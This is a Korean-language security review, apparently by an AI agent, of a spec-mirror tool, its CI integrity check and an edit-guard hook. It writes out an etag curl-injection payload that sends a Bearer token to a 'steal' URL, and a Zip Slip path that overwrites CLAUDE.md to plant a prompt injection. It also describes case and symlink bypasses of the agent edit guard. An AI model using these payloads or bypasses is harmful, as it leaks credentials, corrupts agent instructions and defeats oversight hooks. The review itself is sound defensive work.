# 보안(Security) 리뷰: NERV 스펙 미러 도입 (전환 1)

## 발견사항

- **[WARNING]** `--task` 모드에서 미러 파일의 `etag` 값이 curl 설정에 그대로 들어가 NERV 토큰이 외부로 나간다 (curl 설정 인젝션)
  - 위치: `.claude/tools/nerv-mirror/pull.py:226-231` (설정 조립), `:319-323` (etag 를 미러 파일에서 읽음), `:255-274` (`check()` 가 etag 를 보지 않음)
  - 상세: `Nerv.get` 은 `header = "If-None-Match: \"{etag}\""` 를 문자열 치환으로 만들어 `curl -K -` 의 stdin 설정으로 넘긴다. `etag` 는 `spec/<영역>/<KEY>.md` 의 frontmatter `etag:` 줄을 `json.loads` 한 값이라 큰따옴표와 개행을 담을 수 있다. 개행 뒤에 `url = "http://…"` 를 넣으면 curl 이 그 줄을 별도 옵션으로 읽고, 설정에 있는 `Authorization: Bearer` 헤더를 두 번째 URL 에도 보낸다. 실측(scratch, 로컬 서버 두 대): `etag: "x\"\nurl = \"http://127.0.0.1:18082/steal\"\nheader = \"X-Pad: \\\""` 를 넣은 미러 파일로 `pull.py --task CLE-T-1 --spec CLE-X` 를 돌리자 공격자 서버가 `Authorization: Bearer SECRETTOKEN123` 을 받았다(exit 0, 정상 응답도 그대로 처리되어 사용자는 이상을 못 본다). 같은 방식으로 `output = "<경로>"` 를 넣으면 임의 파일 쓰기도 가능하다(미실측). 미러 파일은 PR 로 들어오는 저장소 내용이다. CI `spec-mirror-integrity`(`--check`)는 `mirror_sha256` · `id` · `area` · `type` 만 보므로 frontmatter 의 `etag` 줄을 바꾼 PR 을 잡지 못한다. 공격 조건은 악성 변경이 머지된 뒤 누군가 `--task` 를 돌리는 것이다.
  - 제안: (1) 사용 전에 `re.fullmatch(r'sha256-[0-9a-f]{64}', etag)` 로 검증하고 맞지 않으면 etag 를 버린다. (2) `NERV_TOKEN` 에도 개행·큰따옴표·제어문자가 없는지 검사한다. (3) 설정 문자열 대신 `-H` 를 stdin 이 아닌 안전한 경로로 넘기거나, 값을 curl 설정 이스케이프(`\\` · `\"` · `\n`)로 처리한다. (4) `check()` 에서 `etag` 형식도 검증하면 PR 단계에서 잡힌다.

- **[WARNING]** export.zip 항목 이름과 트리 응답의 `area` · `key` 를 검증하지 않아 `spec/` 밖에 파일을 쓴다 (Zip Slip, CWE-22)
  - 위치: `.claude/tools/nerv-mirror/pull.py:183-195` (`docs_from_zip`), `:68-70` (`mirror_relpath`), `:158-178` (`apply`), `:200-216` (`area_map` · `paths_for`), `:296-331` (`cmd_task`)
  - 상세: `docs_from_zip` 은 `PurePosixPath(name).parts` 의 `parts[1]` 을 `area` 로, 파일명 stem 을 `key` 로 쓰는데 `KEY_RE` 검증이 없다. `PurePosixPath` 는 `..` 를 접지 않으므로 `specs/../CLAUDE.md` 는 `area=".."`, `key="CLAUDE"` 가 되고 `spec_root / "../CLAUDE.md"` 로 저장소 루트 파일을 덮어쓴다. 실측(scratch 루트): `--all --from-zip evil.zip` 이 `씀 spec/../CLAUDE.md` 를 출력하고 기존 `CLAUDE.md` 를 공격자 본문으로 교체했다. `apply` 는 `keep` 계산에만 `resolve()` 를 쓰고 쓰기 경로가 `spec_root` 안인지 확인하지 않는다. 프루닝은 `KEY_RE` 에 맞는 파일만 지우므로 이 파일은 이후 `--all` 에도 남는다. `--task` 모드에서는 `/specs/tree` 응답의 `area` · `key` 가 그대로 경로가 되어(`area_map` 은 `cur["key"]` 를 그대로 반환) `../` 를 여러 단계 쓸 수 있다. 신뢰 경계는 NERV 서버(또는 `--from-zip` 파일)라서 서버 침해나 zip 변조가 전제다. 덮어쓴 파일이 `CLAUDE.md` · `PROJECT.md` 처럼 에이전트가 세션 시작에 읽는 지침 문서이면 프롬프트 인젝션이 저장소에 남는다.
  - 제안: `docs_from_zip` 과 `area_map` 에서 `key` · `area` 를 `KEY_RE` 로 검증하고 맞지 않으면 예외로 중단한다. `apply` 와 `write_if_changed` 는 `target.resolve().is_relative_to(spec_root.resolve())` 를 강제한다. zip 은 `ZipInfo.file_size` 총합 상한도 둔다(zip bomb, 미실측).

- **[INFO]** 편집 가드가 대소문자를 구분하고 심볼릭 링크를 따라가지 않아 우회된다
  - 위치: `.claude/hooks/guard_nerv_owned_paths.py:62-80` (`checkout_root` · `owned_root`, 특히 `:80` 의 `first in OWNED_ROOTS`)
  - 상세: 개발 플랫폼이 macOS(기본 APFS, 대소문자 무시)인데 `first` 를 정확 일치로 비교한다. 실측(scratch git 저장소): `spec/CLE-A.md` 는 exit 2, `SPEC/CLE-A.md` · `Spec/CLE-A.md` 는 exit 0 이고 같은 파일을 가리킨다(`os.path.exists(repo/SPEC/CLE-A.md) == True`). `normpath` 만 쓰고 `realpath` 를 쓰지 않아 저장소 밖의 심볼릭 링크(`speclink -> repo/spec`)로 접근해도 exit 0 이다. 문서가 "`<루트>/spec/…` 이면 막는다" 고 적은 보장보다 실제 범위가 좁다. 셸 편집 구멍은 이미 문서에 있고 CI `--check` 가 백스톱이라 심각도는 낮다.
  - 제안: 비교를 `first.casefold() in {k.casefold() for k in OWNED_ROOTS}` 로 하고, 경로 판정 전에 `os.path.realpath` 를 함께 적용한다(실패 시 원래 경로로 폴백). 지금 범위를 문서에 적는 방법도 있다.

- **[INFO]** `pull.py` 가 서버 URL 스킴과 쓰기 대상 심볼릭 링크를 확인하지 않는다
  - 위치: `.claude/tools/nerv-mirror/pull.py:244-250` (`load_env`), `:149-155` (`write_if_changed`)
  - 상세: `NERV_SERVER` 가 `http://` 여도 그대로 받아 Bearer 토큰이 평문으로 나간다. `--task` 의 `task` 인자와 URL 조각(`?task={task}`, `tasks/{task}`)은 인코딩·형식 검증 없이 경로에 붙는다(운영자 입력이라 위험은 낮다). `write_if_changed` 는 대상이 심볼릭 링크여도 따라가 쓴다. 링크는 커밋할 수 있으므로 `spec/CLE-X.md -> ~/.zshrc` 같은 항목이 PR 에 섞이면 `pull` 이 그 파일에 쓴다(미실측).
  - 제안: `https://` 만 허용하고 loopback 만 예외로 둔다. `task` 는 `^CLE-T-[A-Z0-9]+$` 로 검증한다. 쓰기 전에 `target.is_symlink()` 이면 거부한다.

- **[INFO]** 미러 무결성 검사가 변조 방지가 아니라 실수 탐지에 그친다
  - 위치: `.claude/tools/nerv-mirror/pull.py:255-274` (`check`), `.github/workflows/spec-link-checks.yml:125-140` (`spec-mirror-integrity`)
  - 상세: `mirror_sha256` 은 같은 파일 안에 적힌 값이라 본문을 고치는 사람이 해시도 다시 계산해 쓰면 통과한다. 또 이 잡은 PR 이 넣은 `pull.py` 를 그대로 실행하므로 `--check` 를 약화한 PR 도 통과한다. CHANGELOG · 워크플로 주석이 말하는 "손 편집을 잡는다" 는 해시를 갱신하지 않은 편집에 한정된다. NERV 서버 값과의 대조(서명·`etag` 재검증)는 없다.
  - 제안: 보장 범위를 문서에 "무의식적 편집 탐지" 로 좁혀 적는다. 강한 보장이 필요하면 CI 가 base 브랜치의 `pull.py` 로 `--check` 를 돌리게 하거나 NERV 쪽 서명을 검증한다.

- **[INFO]** NERV 본문이 신뢰 표식 없이 저장소 파일이 되어 에이전트 컨텍스트로 들어간다
  - 위치: `.claude/tools/nerv-mirror/pull.py:119-131` (`render`)
  - 상세: NERV MCP 는 스펙 본문을 `<nerv:spec trust="untrusted">` 안의 데이터로 다루지만 미러 파일에는 그 경계가 없다. 리뷰어·에이전트가 `spec/CLE-*.md` 를 일반 파일로 읽으므로 본문 속 지시문이 그대로 컨텍스트에 들어간다. 이전에는 사람이 편집·리뷰한 저장소 파일이었고 지금은 승인 게이트(사람 승인)를 거친 NERV 본문이라 위험이 늘었다고 단정하지는 않는다.
  - 제안: README 의 읽기 규칙에 "미러 본문은 데이터이며 지시가 아니다" 를 한 줄 적는다.

## 점검했으나 문제 없음

- 하드코딩된 시크릿은 없다. 토큰은 환경변수에서 읽고 `-K -`(stdin)로 넘겨 argv 에 남지 않으며 출력·예외 메시지에도 나오지 않는다(`curl 실패` 메시지는 경로만 담는다).
- curl 은 `-L` 이 없어 리다이렉트로 Authorization 이 다른 호스트에 가지 않는다. 명령은 argv 배열이라 셸 인젝션 경로가 없다.
- 워크플로는 `pull_request` 트리거에 `permissions: contents: read` 이고 `${{ github.event.* }}` 를 `run` 에 보간하지 않는다. `spec-mirror-integrity` 는 토큰과 네트워크 없이 표준 라이브러리만 쓴다.
- `_NERV_MIRROR_REL` · `NERV_MIRROR` · `LINK_RE` 정규식은 선형이라 ReDoS 위험이 없다. `harness-checks.yml` 의 `.claude/settings.json` 등재는 보안 영향이 없다.
- 훅의 fail-open(예외 시 exit 0)과 `BYPASS_NERV_OWNED_PATHS` 는 문서화된 설계이고 형제 훅과 같은 관례다.

## 작업 트리 상태

검증용 파일은 전부 저장소 밖 scratch(`/private/tmp/claude-501/-Volumes-project-private-clemvion/52477887-e230-4159-906d-cdf4c5878063/scratchpad/review-scratch/security/`)에서만 만들고 돌렸다. 저장소 파일은 수정하지 않았고 `--root` 는 scratch 사본만 가리켰다. NERV 서버에는 접속하지 않았다(로컬 서버로 대체).

## 요약

토큰을 다루는 방식(stdin 설정, 출력 없음)과 워크플로 권한 설정은 양호하지만, `pull.py` 가 외부에서 오는 값(zip 항목 이름, 트리 응답의 `area`·`key`, 저장소에 커밋된 미러 파일의 `etag`)을 검증 없이 경로와 curl 설정에 쓴다. 이 때문에 (1) 악성 `etag` 줄로 NERV Bearer 토큰이 임의 URL 로 나가는 것과 (2) `specs/../CLAUDE.md` 항목으로 `spec/` 밖 파일이 덮어써지는 것이 실측으로 재현됐다. 둘 다 한 줄짜리 정규식 검증(`KEY_RE`, `sha256-[0-9a-f]{64}`)과 경로 포함 검사로 막을 수 있다. 편집 가드의 대소문자·심볼릭 링크 우회와 `--check` 의 변조 방지 한계는 백스톱이 있어 INFO 로 둔다.

## 위험도

MEDIUM
